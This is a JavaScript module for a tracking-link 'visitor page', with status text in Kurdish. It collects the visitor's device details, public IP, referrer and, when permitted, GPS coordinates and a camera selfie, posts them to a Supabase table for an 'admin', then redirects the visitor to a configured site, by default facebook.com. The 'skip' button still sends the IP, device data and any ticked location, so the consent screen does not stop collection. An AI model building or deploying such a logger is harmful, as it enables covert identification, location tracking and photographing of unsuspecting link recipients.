import {
  getDeviceInfo,
  fetchPublicIp,
  requestLocation,
  captureSelfie,
} from "./collect.js";

function cfg() {
  return window.APP_CONFIG || {};
}

async function saveVisit(payload) {
  const { supabaseUrl, supabaseAnonKey } = cfg();
  if (!supabaseUrl || !supabaseAnonKey || supabaseUrl.includes("YOUR_PROJECT")) {
    console.warn("Supabase not configured; visit logged locally only.", payload);
    return { ok: false, local: true };
  }

  const res = await fetch(`${supabaseUrl}/rest/v1/visits`, {
    method: "POST",
    headers: {
      apikey: supabaseAnonKey,
      Authorization: `Bearer ${supabaseAnonKey}`,
      "Content-Type": "application/json",
      Prefer: "return=minimal",
    },
    body: JSON.stringify(payload),
  });

  if (!res.ok) {
    const text = await res.text();
    throw new Error(text || `HTTP ${res.status}`);
  }
  return { ok: true };
}

function setStatus(el, text, isError = false) {
  el.textContent = text;
  el.classList.toggle("error", isError);
}

export function initVisitorPage() {
  const consentSection = document.getElementById("consent-section");
  const progressSection = document.getElementById("progress-section");
  const statusEl = document.getElementById("status");
  const videoEl = document.getElementById("preview");
  const btnAccept = document.getElementById("btn-accept");
  const btnSkip = document.getElementById("btn-skip");

  const wantCamera = () =>
    document.getElementById("opt-camera")?.checked ?? false;
  const wantLocation = () =>
    document.getElementById("opt-location")?.checked ?? false;

  async function runFlow(tryCamera) {
    consentSection.classList.add("hidden");
    progressSection.classList.remove("hidden");

    const deviceInfo = getDeviceInfo();
    setStatus(statusEl, "زانیاری ئامێر و ئایپی کۆدەکرێتەوە…");

    let ipPayload = { ip: null, source: null };
    try {
      ipPayload = await fetchPublicIp();
    } catch {
      /* continue */
    }

    let locationPayload = { granted: false };
    if (wantLocation()) {
      setStatus(statusEl, "داوای ڕێگەی شوێن (لۆکەیشن) دەکرێت…");
      locationPayload = await requestLocation();
    }

    let photoPayload = { granted: false, dataUrl: null };
    if (tryCamera && wantCamera()) {
      setStatus(statusEl, "کامێرا… تکایە ڕێگە بدە یان ڕەت بکەوە.");
      videoEl.classList.remove("hidden");
      try {
        photoPayload = await captureSelfie(videoEl);
      } catch {
        photoPayload = { granted: false, error: "denied_or_unavailable" };
      }
      videoEl.classList.add("hidden");
    }

    setStatus(statusEl, "ناردن بۆ ئەدمین…");

    const payload = {
      ip: ipPayload.ip,
      ip_source: ipPayload.source,
      device_info: deviceInfo,
      location_granted: locationPayload.granted,
      location: locationPayload.granted
        ? {
            latitude: locationPayload.latitude,
            longitude: locationPayload.longitude,
            accuracy: locationPayload.accuracy,
          }
        : null,
      camera_granted: !!photoPayload.granted,
      photo_base64: photoPayload.dataUrl || null,
      referrer: document.referrer || null,
      page_url: location.href,
    };

    try {
      await saveVisit(payload);
    } catch (e) {
      setStatus(statusEl, "هەڵە لە ناردن: " + e.message, true);
      btnSkip.classList.remove("hidden");
      btnSkip.textContent = "بەردەوام بە بۆ لینکەکە";
      btnSkip.onclick = () => redirect();
      return;
    }

    setStatus(statusEl, "سوپاس — ئێستا دەگوازرێیتەوە…");
    setTimeout(redirect, 800);
  }

  function redirect() {
    const url = cfg().redirectUrl || "https://www.facebook.com";
    window.location.replace(url);
  }

  btnAccept.addEventListener("click", () => {
    btnAccept.disabled = true;
    runFlow(true);
  });

  btnSkip.addEventListener("click", () => {
    btnSkip.disabled = true;
    runFlow(false);
  });
}
